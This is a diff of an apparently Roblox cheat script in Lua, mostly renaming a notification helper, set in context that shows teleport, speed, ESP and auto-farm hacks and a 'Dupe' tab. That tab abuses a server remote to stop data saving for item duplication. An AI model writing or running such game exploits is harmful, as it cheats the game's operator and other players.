                 myroot.CFrame = CFrame.new(MiscPositionsTable[1] + Vector3.new(0, 5, 0))
-                MakeAtlasNotification('Item Found', 'Teleported to ' .. getgenv().MiscItems, 2)
+                MakeNotification('Item Found', 'Teleported to ' .. getgenv().MiscItems, 2)
             end
         end
     end
@@ -2507,18 +2185,17 @@ MiscFindingSection:CreateDropdown({
     ItemSelecting = true,
     Callback = function(Value)
        getgenv().MiscItems = Value 
-       MakeAtlasNotification('Item Type', 'Set to: ' .. Value, 2)
+       MakeNotification('Item Type', 'Set to: ' .. Value, 2)
     end
 })
 
--- TREASURE CHEST CONTENT MOVED HERE
 local ChestSpawningSection = Farming:CreateSection('Chest Spawning')
 
 ChestSpawningSection:CreateButton({
     Name = 'Spawn Easy Treasure Chest(100 tokens)',
     Callback = function()
         RemoteEvents['BuyWorldEvent']:FireServer(1)
-        MakeAtlasNotification('Chest Spawn', 'Easy Treasure Chest has been spawned', 2)
+        MakeNotification('Chest Spawn', 'Easy Treasure Chest has been spawned', 2)
     end
 })
 
@@ -2526,7 +2203,7 @@ ChestSpawningSection:CreateButton({
     Name = 'Spawn Medium Treasure Chest(450 tokens)',
     Callback = function()
         RemoteEvents['BuyWorldEvent']:FireServer(2)
-        MakeAtlasNotification('Chest Spawn', 'Medium Treasure Chest has been spawned', 2)
+        MakeNotification('Chest Spawn', 'Medium Treasure Chest has been spawned', 2)
     end
 })
 
@@ -2534,7 +2211,7 @@ ChestSpawningSection:CreateButton({
     Name = 'Spawn Hard Treasure Chest(1000 tokens)',
     Callback = function()
         RemoteEvents['BuyWorldEvent']:FireServer(3)
-        MakeAtlasNotification('Chest Spawn', 'Hard Treasure Chest has been spawned', 2)
+        MakeNotification('Chest Spawn', 'Hard Treasure Chest has been spawned', 2)
     end
 })
 
@@ -2544,7 +2221,7 @@ ChestOpeningSection:CreateButton({
     Name = 'Open Easy Chest',
     Callback = function()
         RemoteEvents['InventoryInteraction']:FireServer(166, "Open")
-        MakeAtlasNotification('Chest Open', 'Easy Chest has been opened', 1)
+        MakeNotification('Chest Open', 'Easy Chest has been opened', 1)
     end
 })
 
@@ -2552,7 +2229,7 @@ ChestOpeningSection:CreateButton({
     Name = 'Open Medium Chest',
     Callback = function()
         RemoteEvents['InventoryInteraction']:FireServer(167, "Open")
-        MakeAtlasNotification('Chest Open', 'Medium Chest has been opened', 1)
+        MakeNotification('Chest Open', 'Medium Chest has been opened', 1)
     end
 })
 
@@ -2560,7 +2237,7 @@ ChestOpeningSection:CreateButton({
     Name = 'Open Hard Chest',
     Callback = function()
         RemoteEvents['InventoryInteraction']:FireServer(168, "Open")
-        MakeAtlasNotification('Chest Open', 'Hard Chest has been opened', 1)
+        MakeNotification('Chest Open', 'Hard Chest has been opened', 1)
     end
 })
 
@@ -2587,9 +2264,9 @@ ChestFindingSection:CreateButton({
                 myroot.CFrame = oldpos
             end
             if not GetAllTreasure() then
-                MakeAtlasNotification('No chests spawned in :(', 'Try spawning one in! or..... wait.', 3)
+                MakeNotification('No chests spawned in :(', 'Try spawning one in! or..... wait.', 3)
             else
-                MakeAtlasNotification('Treasure Collected', 'All treasure chests have been collected', 2)
+                MakeNotification('Treasure Collected', 'All treasure chests have been collected', 2)
             end
         end
     end
@@ -2634,12 +2311,12 @@ ClueHelperSection:CreateButton({
                     return true
                 end
             else
-                MakeAtlasNotification("Clue not found", 'Your clue is not on the map', 3)
+                MakeNotification("Clue not found", 'Your clue is not on the map', 3)
                 return false
             end
         end
         if TrackClue() then
-            MakeAtlasNotification('Must wear(if so):', loadoutsubbed, 7)
+            MakeNotification('Must wear(if so):', loadoutsubbed, 7)
         end
     end
 })
@@ -2681,7 +2358,7 @@ ClueHelperSection:CreateButton({
             end
         end
         if TrackClueImage() then
-            MakeAtlasNotification('Must wear(if so):', loadoutsubbed, 7)
+            MakeNotification('Must wear(if so):', loadoutsubbed, 7)
         end
     end
 })
@@ -2696,9 +2373,9 @@ BossFarmSettingSection:CreateToggle({
         getgenv().configs.AutoRepairClub = Value
         AutoRepairClub()
         if Value then
-            MakeAtlasNotification('Auto Repair Club', 'Auto Repair Club has been enabled', 2)
+            MakeNotification('Auto Repair Club', 'Auto Repair Club has been enabled', 2)
         else
-            MakeAtlasNotification('Auto Repair Club', 'Auto Repair Club has been disabled', 2)
+            MakeNotification('Auto Repair Club', 'Auto Repair Club has been disabled', 2)
         end
     end
 })
@@ -2710,9 +2387,9 @@ BossFarmSettingSection:CreateToggle({
     Callback = function(Value)
         getgenv().configs.UseSoulKeys = Value
         if Value then
-            MakeAtlasNotification('Soul Keys', 'Soul Keys mode has been enabled', 2)
+            MakeNotification('Soul Keys', 'Soul Keys mode has been enabled', 2)
         else
-            MakeAtlasNotification('Soul Keys', 'Soul Keys mode has been disabled', 2)
+            MakeNotification('Soul Keys', 'Soul Keys mode has been disabled', 2)
         end
     end
 })
@@ -2727,9 +2404,9 @@ BossFarmsSection:CreateToggle({
         getgenv().configs.ObsidianBoss = Value
         ObsidianBoss()
         if Value then
-            MakeAtlasNotification('Obsidian Boss Farm', 'Obsidian Boss Farm has been enabled', 2)
+            MakeNotification('Obsidian Boss Farm', 'Obsidian Boss Farm has been enabled', 2)
         else
-            MakeAtlasNotification('Obsidian Boss Farm', 'Obsidian Boss Farm has been disabled', 2)
+            MakeNotification('Obsidian Boss Farm', 'Obsidian Boss Farm has been disabled', 2)
         end
     end
 })
@@ -2742,9 +2419,9 @@ BossFarmsSection:CreateToggle({
         getgenv().configs.ZenLuckBoss = Value
         ZenLuckBoss()
         if Value then
-            MakeAtlasNotification('Zenyte/Lucky Boss', 'Zenyte/Lucky Boss Farm has been enabled', 2)
+            MakeNotification('Zenyte/Lucky Boss', 'Zenyte/Lucky Boss Farm has been enabled', 2)
         else
-            MakeAtlasNotification('Zenyte/Lucky Boss', 'Zenyte/Lucky Boss Farm has been disabled', 2)
+            MakeNotification('Zenyte/Lucky Boss', 'Zenyte/Lucky Boss Farm has been disabled', 2)
         end
     end
 })
@@ -2757,9 +2434,9 @@ BossFarmsSection:CreateToggle({
         getgenv().configs.SpiritBoss = Value
         SpiritBoss()
         if Value then
-            MakeAtlasNotification('Spirit Boss', 'Spirit Boss Farm has been enabled', 2)
+            MakeNotification('Spirit Boss', 'Spirit Boss Farm has been enabled', 2)
         else
-            MakeAtlasNotification('Spirit Boss', 'Spirit Boss Farm has been disabled', 2)
+            MakeNotification('Spirit Boss', 'Spirit Boss Farm has been disabled', 2)
         end
     end
 })
@@ -2774,9 +2451,9 @@ NotAutoSection:CreateToggle({
         getgenv().configs.LuckySlime = Value
         LuckySlime()
         if Value then
-            MakeAtlasNotification('Lucky Slime', 'Lucky Slime Farm has been enabled', 2)
+            MakeNotification('Lucky Slime', 'Lucky Slime Farm has been enabled', 2)
         else
-            MakeAtlasNotification('Lucky Slime', 'Lucky Slime Farm has been disabled', 2)
+            MakeNotification('Lucky Slime', 'Lucky Slime Farm has been disabled', 2)
         end
     end
 })
@@ -2789,9 +2466,9 @@ NotAutoSection:CreateToggle({
         getgenv().configs.EvilSkeleton = Value
         EvilSkeleton()
         if Value then
-            MakeAtlasNotification('Evil Skeleton', 'Evil Skeleton Farm has been enabled', 2)
+            MakeNotification('Evil Skeleton', 'Evil Skeleton Farm has been enabled', 2)
         else
-            MakeAtlasNotification('Evil Skeleton', 'Evil Skeleton Farm has been disabled', 2)
+            MakeNotification('Evil Skeleton', 'Evil Skeleton Farm has been disabled', 2)
         end
     end
 })
@@ -2804,9 +2481,9 @@ NotAutoSection:CreateToggle({
         getgenv().configs.Ogre = Value
         Ogre()
         if Value then
-            MakeAtlasNotification('Ogre Farm', 'Ogre Farm has been enabled', 2)
+            MakeNotification('Ogre Farm', 'Ogre Farm has been enabled', 2)
         else
-            MakeAtlasNotification('Ogre Farm', 'Ogre Farm has been disabled', 2)
+            MakeNotification('Ogre Farm', 'Ogre Farm has been disabled', 2)
         end
     end
 })
@@ -2819,9 +2496,9 @@ NotAutoSection:CreateToggle({
         getgenv().configs.Squid = Value
         Squid()
         if Value then
-            MakeAtlasNotification('Captain Squid', 'Captain Squid Farm has been enabled', 2)
+            MakeNotification('Captain Squid', 'Captain Squid Farm has been enabled', 2)
         else
-            MakeAtlasNotification('Captain Squid', 'Captain Squid Farm has been disabled', 2)
+            MakeNotification('Captain Squid', 'Captain Squid Farm has been disabled', 2)
         end
     end
 })
@@ -2841,9 +2518,9 @@ EventsSection:CreateButton({
                 local AstPos = Workspace:FindFirstChild('Asteroid', true):GetPivot().Position
                 local myroot = LocalPlayer.Character.HumanoidRootPart
                 myroot.CFrame = CFrame.new(AstPos + Vector3.new(0, 35, 0))
-                MakeAtlasNotification('Teleport', 'Teleported to Asteroid', 2)
+                MakeNotification('Teleport', 'Teleported to Asteroid', 2)
             else
-                MakeAtlasNotification('No Asteroids gangy', 'A sad sad day... I know :(', 3)
+                MakeNotification('No Asteroids gangy', 'A sad sad day... I know :(', 3)
             end
         end
     end
@@ -2859,10 +2536,10 @@ EventsSection:CreateButton({
                     local slimepos = slime.HumanoidRootPart.Position
                     local myroot = LocalPlayer.Character.HumanoidRootPart
                     myroot.CFrame = CFrame.new(slimepos + Vector3.new(15, 0, 0))
-                    MakeAtlasNotification('Teleport', 'Teleported to Lucky Slime', 2)
+                    MakeNotification('Teleport', 'Teleported to Lucky Slime', 2)
                 end
             else
-                MakeAtlasNotification('No Lucky Slime gangy', 'A sad sad day... I know :(', 3)
+                MakeNotification('No Lucky Slime gangy', 'A sad sad day... I know :(', 3)
             end
         end
     end
@@ -2874,7 +2551,7 @@ EventsSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(1944.84009, -6.88914394, -3933.60352, -0.775113165, 2.15758467e-10, 0.631822467, 5.72924108e-09, 1, 6.68708688e-09, -0.631822467, 8.80311202e-09, -0.775113165)
-            MakeAtlasNotification('Teleport', 'Teleported to Mega Candy Rock', 2)
+            MakeNotification('Teleport', 'Teleported to Mega Candy Rock', 2)
         end
     end
 })
@@ -2887,7 +2564,7 @@ TradersSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(4288, 43, -4014)
-            MakeAtlasNotification('Teleport', 'Teleported to Resource Trader', 2)
+            MakeNotification('Teleport', 'Teleported to Resource Trader', 2)
         end
     end
 })
@@ -2898,7 +2575,7 @@ TradersSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(427, 12, -3451)
-            MakeAtlasNotification('Teleport', 'Teleported to Armor/Weapon Trader', 2)
+            MakeNotification('Teleport', 'Teleported to Armor/Weapon Trader', 2)
         end
     end
 })
@@ -2909,7 +2586,7 @@ TradersSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(1673, -290, -5659)
-            MakeAtlasNotification('Teleport', 'Teleported to Ocean Trader', 2)
+            MakeNotification('Teleport', 'Teleported to Ocean Trader', 2)
         end
     end
 })
@@ -2922,7 +2599,7 @@ VolcanoSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(-842, 63, -3603)
-            MakeAtlasNotification('Teleport', 'Teleported to Volcano', 2)
+            MakeNotification('Teleport', 'Teleported to Volcano', 2)
         end
     end
 })
@@ -2933,7 +2610,7 @@ VolcanoSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(2614, -454, -5579)
-            MakeAtlasNotification('Teleport', 'Teleported to Volcanic Furnace', 2)
+            MakeNotification('Teleport', 'Teleported to Volcanic Furnace', 2)
         end
     end
 })
@@ -2946,7 +2623,7 @@ CavesSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(1741, -440, -4536)
-            MakeAtlasNotification('Teleport', 'Teleported to Zenyte Boss', 2)
+            MakeNotification('Teleport', 'Teleported to Zenyte Boss', 2)
         end
     end
 })
@@ -2957,7 +2634,7 @@ CavesSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(1427, -293, -4959)
-            MakeAtlasNotification('Teleport', 'Teleported to Spirit Boss', 2)
+            MakeNotification('Teleport', 'Teleported to Spirit Boss', 2)
         end
     end
 })
@@ -2968,7 +2645,7 @@ CavesSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(1581, -502, -4649)
-            MakeAtlasNotification('Teleport', 'Teleported to Caves Level 3', 2)
+            MakeNotification('Teleport', 'Teleported to Caves Level 3', 2)
         end
     end
 })
@@ -2979,7 +2656,7 @@ CavesSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(1559, -347, -4635)
-            MakeAtlasNotification('Teleport', 'Teleported to Caves Level 2', 2)
+            MakeNotification('Teleport', 'Teleported to Caves Level 2', 2)
         end
     end
 })
@@ -2990,7 +2667,7 @@ CavesSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(1532, -192, -4696)
-            MakeAtlasNotification('Teleport', 'Teleported to Central Caves', 2)
+            MakeNotification('Teleport', 'Teleported to Central Caves', 2)
         end
     end
 })
@@ -3003,7 +2680,7 @@ IslandSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(1961, -2, -3973)
-            MakeAtlasNotification('Teleport', 'Teleported to Ice Biome', 2)
+            MakeNotification('Teleport', 'Teleported to Ice Biome', 2)
         end
     end
 })
@@ -3014,7 +2691,7 @@ IslandSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(2889, 54, -6465)
-            MakeAtlasNotification('Teleport', 'Teleported to Pet Island', 2)
+            MakeNotification('Teleport', 'Teleported to Pet Island', 2)
         end
     end
 })
@@ -3025,7 +2702,7 @@ IslandSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(3400, 13, -4467)
-            MakeAtlasNotification('Teleport', 'Teleported to Banaenae Island', 2)
+            MakeNotification('Teleport', 'Teleported to Banaenae Island', 2)
         end
     end
 })
@@ -3036,7 +2713,7 @@ IslandSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(1292, 125, -7234)
-            MakeAtlasNotification('Teleport', 'Teleported to Magic Island', 2)
+            MakeNotification('Teleport', 'Teleported to Magic Island', 2)
         end
     end
 })
@@ -3047,7 +2724,7 @@ IslandSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(-7507, 19, 7496)
-            MakeAtlasNotification('Teleport', 'Teleported to Starter Island', 2)
+            MakeNotification('Teleport', 'Teleported to Starter Island', 2)
         end
     end
 })
@@ -3058,7 +2735,7 @@ IslandSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(7139, 72, 18673)
-            MakeAtlasNotification('Teleport', 'Teleported to Secret Island', 2)
+            MakeNotification('Teleport', 'Teleported to Secret Island', 2)
         end
     end
 })
@@ -3071,7 +2748,7 @@ LeaderboardSection:CreateButton({
         if IsPlayerAlive(LocalPlayer) then
             local myroot = LocalPlayer.Character.HumanoidRootPart
             myroot.CFrame = CFrame.new(5313, 4, -5508)
-            MakeAtlasNotification('Teleport', 'Teleported to Leaderboard', 2)
+            MakeNotification('Teleport', 'Teleported to Leaderboard', 2)
         end
     end
 })
@@ -3091,9 +2768,9 @@ PlayerModificationsSection:CreateToggle({
         getgenv().configs.InfJump = Value
         InfJump()
         if Value then
-            MakeAtlasNotification('Inf-Jump', 'Infinite Jump has been enabled', 2)
+            MakeNotification('Inf-Jump', 'Infinite Jump has been enabled', 2)
         else
-            MakeAtlasNotification('Inf-Jump', 'Infinite Jump has been disabled', 2)
+            MakeNotification('Inf-Jump', 'Infinite Jump has been disabled', 2)
         end
     end
 })
@@ -3126,9 +2803,9 @@ PlayerModificationsSection:CreateToggle({
             end
         end
         if Value then
-            MakeAtlasNotification('Anti-Ragdoll', 'Anti-Ragdoll has been enabled', 2)
+            MakeNotification('Anti-Ragdoll', 'Anti-Ragdoll has been enabled', 2)
         else
-            MakeAtlasNotification('Anti-Ragdoll', 'Anti-Ragdoll has been disabled', 2)
+            MakeNotification('Anti-Ragdoll', 'Anti-Ragdoll has been disabled', 2)
         end
     end
 })
@@ -3139,7 +2816,7 @@ PlayerModificationsSection:CreateKeybind({
     Flag = 'QuickSpeed',
     Callback = function(key)
         getgenv().QuickSpeedKey = key
-        MakeAtlasNotification('QuickSpeed Key', 'Key set to: ' .. tostring(key), 2)
+        MakeNotification('QuickSpeed Key', 'Key set to: ' .. tostring(key), 2)
     end,
     KeyPressed = function()
         while UserInputService:IsKeyDown(getgenv().QuickSpeedKey) and not UserInputService:GetFocusedTextBox() do
@@ -3162,7 +2839,7 @@ PlayerModificationsSection:CreateSlider({
     Flag = 'QuickSpeedMultiplier',
     Callback = function(Value)
         getgenv().QuickSpeedMultiplier = Value
-        MakeAtlasNotification('QuickSpeed Multiplier', 'Set to: ' .. tostring(Value), 2)
+        MakeNotification('QuickSpeed Multiplier', 'Set to: ' .. tostring(Value), 2)
     end     
 })
 
@@ -3176,7 +2853,7 @@ PlayerModificationsSection:CreateSlider({
     Callback = function(Value)
         local Constants = require(ReplicatedStorage:WaitForChild('References'):WaitForChild('SharedData'):WaitForChild('CONSTANTS'))
         Constants.WALK_SPEEDS.SWIM = Value
-        MakeAtlasNotification('Swim Speed', 'Set to: ' .. tostring(Value), 2)
+        MakeNotification('Swim Speed', 'Set to: ' .. tostring(Value), 2)
     end 
 })
 
@@ -3188,9 +2865,9 @@ PlayerModificationsSection:CreateToggle({
        getgenv().configs.JumpPower = Value 
        JumpPower()
        if Value then
-            MakeAtlasNotification('Jump Power', 'Jump Power has been enabled', 2)
+            MakeNotification('Jump Power', 'Jump Power has been enabled', 2)
         else
-            MakeAtlasNotification('Jump Power', 'Jump Power has been disabled', 2)
+            MakeNotification('Jump Power', 'Jump Power has been disabled', 2)
         end
     end
 })
@@ -3203,14 +2880,13 @@ PlayerModificationsSection:CreateToggle({
         getgenv().configs.ExtraSpeed = Value 
         ExtraSpeed()
         if Value then
-            MakeAtlasNotification('Sneaky Speed', 'Sneaky Speed has been enabled', 2)
+            MakeNotification('Sneaky Speed', 'Sneaky Speed has been enabled', 2)
         else
-            MakeAtlasNotification('Sneaky Speed', 'Sneaky Speed has been disabled', 2)
+            MakeNotification('Sneaky Speed', 'Sneaky Speed has been disabled', 2)
         end
     end
 })
 
--- AUTO EAT MOVED HERE
 local AutoEatSection = LPlayer:CreateSection('Auto Eat')
 
 AutoEatSection:CreateToggle({
@@ -3221,9 +2897,9 @@ AutoEatSection:CreateToggle({
         getgenv().configs.AutoEat = Value
         AutoEat()
         if Value then
-            MakeAtlasNotification('Auto Eat', 'Auto Eat has been enabled', 2)
+            MakeNotification('Auto Eat', 'Auto Eat has been enabled', 2)
         else
-            MakeAtlasNotification('Auto Eat', 'Auto Eat has been disabled', 2)
+            MakeNotification('Auto Eat', 'Auto Eat has been disabled', 2)
         end
     end
 })
@@ -3234,11 +2910,10 @@ AutoEatSection:CreateDropdown({
     ItemSelecting = true,
     Callback = function(Value)
         getgenv().configs.EatingType = Value
-        MakeAtlasNotification('Auto Eat Type', 'Set to: ' .. Value, 2)
+        MakeNotification('Auto Eat Type', 'Set to: ' .. Value, 2)
     end
 })
 
--- VISUALS MOVED HERE
 local VisualsSection = LPlayer:CreateSection('Visuals')
 
 VisualsSection:CreateToggle({
@@ -3249,9 +2924,9 @@ VisualsSection:CreateToggle({
         getgenv().configs.PlayerEsp = Value
         PlayerEsp()
         if Value then
-            MakeAtlasNotification('ESP', 'ESP has been enabled', 2)
+            MakeNotification('ESP', 'ESP has been enabled', 2)
         else
-            MakeAtlasNotification('ESP', 'ESP has been disabled', 2)
+            MakeNotification('ESP', 'ESP has been disabled', 2)
         end
     end
 })
@@ -3267,7 +2942,7 @@ VisualsSection:CreateSliderToggle({
     ToggleFlag = 'ToggleTimeOfDay',
     SliderCallback = function(Value)
         _G.ClockTime = Value
-        MakeAtlasNotification('Time Of Day', 'Set to: ' .. tostring(Value), 2)
+        MakeNotification('Time Of Day', 'Set to: ' .. tostring(Value), 2)
     end,
     ToggleCallback = function(Value)
         if _G.ClockTime then
@@ -3291,9 +2966,9 @@ VisualsSection:CreateSliderToggle({
             end
         end
         if Value then
-            MakeAtlasNotification('Time Of Day', 'Time Of Day has been locked', 2)
+            MakeNotification('Time Of Day', 'Time Of Day has been locked', 2)
         else
-            MakeAtlasNotification('Time Of Day', 'Time Of Day has been unlocked', 2)
+            MakeNotification('Time Of Day', 'Time Of Day has been unlocked', 2)
         end
     end    
 })
@@ -3309,7 +2984,7 @@ VisualsSection:CreateSliderToggle({
     ToggleFlag = 'ToggleBrightness',
     SliderCallback = function(Value)
         _G.Brightness = Value
-        MakeAtlasNotification('Brightness', 'Set to: ' .. tostring(Value), 2)
+        MakeNotification('Brightness', 'Set to: ' .. tostring(Value), 2)
     end,
     ToggleCallback = function(Value)
         if _G.Brightness then
@@ -3333,9 +3008,9 @@ VisualsSection:CreateSliderToggle({
             end
         end
         if Value then
-            MakeAtlasNotification('Brightness', 'Brightness has been locked', 2)
+            MakeNotification('Brightness', 'Brightness has been locked', 2)
         else
-            MakeAtlasNotification('Brightness', 'Brightness has been unlocked', 2)
+            MakeNotification('Brightness', 'Brightness has been unlocked', 2)
         end
     end    
 })
@@ -3351,16 +3026,16 @@ VisualsSection:CreateSliderToggle({
     ToggleFlag = 'ToggleSaturation',
     SliderCallback = function(Value)
         _G.Saturation = Value
-        MakeAtlasNotification('Saturation', 'Set to: ' .. tostring(Value), 2)
+        MakeNotification('Saturation', 'Set to: ' .. tostring(Value), 2)
     end,
     ToggleCallback = function(Value)
         if _G.Saturation then
             Lighting:WaitForChild('ColorCorrection').Saturation = _G.Saturation
         end
         if Value then
-            MakeAtlasNotification('Saturation', 'Saturation has been locked', 2)
+            MakeNotification('Saturation', 'Saturation has been locked', 2)
         else
-            MakeAtlasNotification('Saturation', 'Saturation has been unlocked', 2)
+            MakeNotification('Saturation', 'Saturation has been unlocked', 2)
         end
     end    
 })
@@ -3376,16 +3051,16 @@ VisualsSection:CreateSliderToggle({
     ToggleFlag = 'ToggleContrast',
     SliderCallback = function(Value)
         _G.Contrast = Value
-        MakeAtlasNotification('Contrast', 'Set to: ' .. tostring(Value), 2)
+        MakeNotification('Contrast', 'Set to: ' .. tostring(Value), 2)
     end,
     ToggleCallback = function(Value)
         if _G.Contrast then
             Lighting:WaitForChild('ColorCorrection').Contrast = _G.Contrast
         end
         if Value then
-            MakeAtlasNotification('Contrast', 'Contrast has been locked', 2)
+            MakeNotification('Contrast', 'Contrast has been locked', 2)
         else
-            MakeAtlasNotification('Contrast', 'Contrast has been unlocked', 2)
+            MakeNotification('Contrast', 'Contrast has been unlocked', 2)
         end
     end    
 })
@@ -3401,7 +3076,7 @@ VisualsSection:CreateSliderToggle({
     ToggleFlag = 'ToggleFogEnd',
     SliderCallback = function(Value)
         _G.FogEnd = Value
-        MakeAtlasNotification('Fog End', 'Set to: ' .. tostring(Value), 2)
+        MakeNotification('Fog End', 'Set to: ' .. tostring(Value), 2)
     end,
     ToggleCallback = function(Value)
         if _G.FogEnd then
@@ -3425,9 +3100,9 @@ VisualsSection:CreateSliderToggle({
             end
         end
         if Value then
-            MakeAtlasNotification('Fog End', 'Fog End has been locked', 2)
+            MakeNotification('Fog End', 'Fog End has been locked', 2)
         else
-            MakeAtlasNotification('Fog End', 'Fog End has been unlocked', 2)
+            MakeNotification('Fog End', 'Fog End has been unlocked', 2)
         end
     end    
 })
@@ -3443,16 +3118,16 @@ VisualsSection:CreateSliderToggle({
     ToggleFlag = 'ToggleWaterTransparency',
     SliderCallback = function(Value)
         _G.WaterTransparency = Value
-        MakeAtlasNotification('Water Transparency', 'Set to: ' .. tostring(Value), 2)
+        MakeNotification('Water Transparency', 'Set to: ' .. tostring(Value), 2)
     end,
     ToggleCallback = function(Value)
         if _G.WaterTransparency then
             Workspace:WaitForChild('Terrain').WaterTransparency = _G.WaterTransparency
         end
         if Value then
-            MakeAtlasNotification('Water Transparency', 'Water Transparency has been locked', 2)
+            MakeNotification('Water Transparency', 'Water Transparency has been locked', 2)
         else
-            MakeAtlasNotification('Water Transparency', 'Water Transparency has been unlocked', 2)
+            MakeNotification('Water Transparency', 'Water Transparency has been unlocked', 2)
         end
     end    
 })
@@ -3463,11 +3138,10 @@ VisualsSection:CreateColorPicker({
     Flag = 'WaterColor',
     Callback = function(Value)
         Workspace:WaitForChild('Terrain').WaterColor = (Value)
-        MakeAtlasNotification('Water Color', 'Water color has been changed', 2)
+        MakeNotification('Water Color', 'Water color has been changed', 2)
     end
 })
 
--- ORIGINAL MISC MODS
 local MiscModSections = LPlayer:CreateSection('Misc Mods')
 
 MiscModSections:CreateButton({
@@ -3490,9 +3164,9 @@ MiscModSections:CreateButton({
         end
         GetCandy()
         if not Workspace:FindFirstChild('Candy', true) then
-            MakeAtlasNotification('No Candies left/found', 'No candies left in the map', 3)
+            MakeNotification('No Candies left/found', 'No candies left in the map', 3)
         else
-            MakeAtlasNotification('Candy Collection', 'All candies have been collected', 2)
+            MakeNotification('Candy Collection', 'All candies have been collected', 2)
         end
     end
 })
@@ -3509,16 +3183,16 @@ if MyInventory:FindFirstChild("Glider") or MyInventory:FindFirstChild("Easter Gl
         ToggleFlag = "GliderModSpeedToggle",
         SliderCallback = function(Value) 
             getgenv().GliderModSpeed = Value
-            MakeAtlasNotification('Glider Speed', 'Set to: ' .. tostring(Value), 2)
+            MakeNotification('Glider Speed', 'Set to: ' .. tostring(Value), 2)
         end,
         ToggleCallback = function(Value)
             local GliderModule = require(LocalPlayer:WaitForChild('PlayerScripts'):WaitForChild('Main'):WaitForChild('ToolController'):WaitForChild('ToolObject'):WaitForChild('Controllers'):WaitForChild('Glider'))
             if Value == true then
                 setconstant(GliderModule.Step, 9, tonumber(getgenv().GliderModSpeed))
-                MakeAtlasNotification('Glider Mod', 'Glider speed mod has been enabled', 2)
+                MakeNotification('Glider Mod', 'Glider speed mod has been enabled', 2)
             else
                 setconstant(GliderModule.Step, 9, 30)
-                MakeAtlasNotification('Glider Mod', 'Glider speed mod has been disabled', 2)
+                MakeNotification('Glider Mod', 'Glider speed mod has been disabled', 2)
             end
         end
     })
@@ -3551,7 +3225,7 @@ MiscModSections:CreateButton({
                 end
             end)
         end
-        MakeAtlasNotification('Restored mesh', 'Candies should now be visible', 3)
+        MakeNotification('Restored mesh', 'Candies should now be visible', 3)
     end
 })
 
@@ -3562,7 +3236,7 @@ MiscModSections:CreateButton({
         Cart.TerrainCheck = function()
             return false 
         end
-        MakeAtlasNotification('Drive in Water', 'Water driving has been enabled', 2)
+        MakeNotification('Drive in Water', 'Water driving has been enabled', 2)
     end
 })
 
@@ -3581,7 +3255,7 @@ MiscModSections:CreateTextBox({
                         local targetpos = plr.Character.HumanoidRootPart.Position
                         local myroot = LocalPlayer.Character.HumanoidRootPart
                         myroot.CFrame = CFrame.new(targetpos)
-                        MakeAtlasNotification('Success', 'Tped to: '..plr.Name, 3)
+                        MakeNotification('Success', 'Tped to: '..plr.Name, 3)
                     end
                 end
             end
@@ -3592,62 +3266,62 @@ MiscModSections:CreateTextBox({
 -- ============================================================
 --  DUPE TAB
 -- ============================================================
-local RealDupeSection = Dupe:CreateSection('Real Duplication Glitch(data does not save)')
+local RealDupeSection = Dupe:CreateSection("Real Duplication Glitch (data does not save)")
 
 RealDupeSection:CreateButton({
-    Name = 'Stop data(dupe)',
-    Callback = function(Value)
-        RemoteEvents['SetSettings']:FireServer(Workspace)
-        MakeAtlasNotification('Data Stopped', 'Data has been stopped. Drop anything you want!', 5)
+    Name = "Stop data (dupe)",
+    Callback = function()
+        RemoteEvents["SetSettings"]:FireServer(Workspace)
+        MakeNotification("Data Stopped", "Data has been stopped. Drop anything you want!", 5)
     end
 })
 
 RealDupeSection:CreateButton({
-    Name = 'Rejoin Current Server',
-    Callback = function(Value)
-        MakeAtlasNotification('Rejoining', 'Rejoining the server...', 1)
+    Name = "Rejoin Current Server",
+    Callback = function()
+        MakeNotification("Rejoining", "Rejoining the server...", 1)
         TeleportService:Teleport(game.PlaceId, LocalPlayer)
     end
 })
 
 RealDupeSection:CreateTextBox({
-    Name = 'Loop Item Drop Name:',
-    DefaultText = '',
-    PlaceholderText = 'Inventory Item',
+    Name = "Loop Item Drop Name:",
+    DefaultText = "",
+    PlaceholderText = "Inventory Item",
     ClearTextOnFocus = true,
-    Flag = 'RepeatDropInventoryItem',
+    Flag = "RepeatDropInventoryItem",
     Callback = function(args)
         if args == "" then return end
         for _, item in pairs(MyInventory:GetChildren()) do
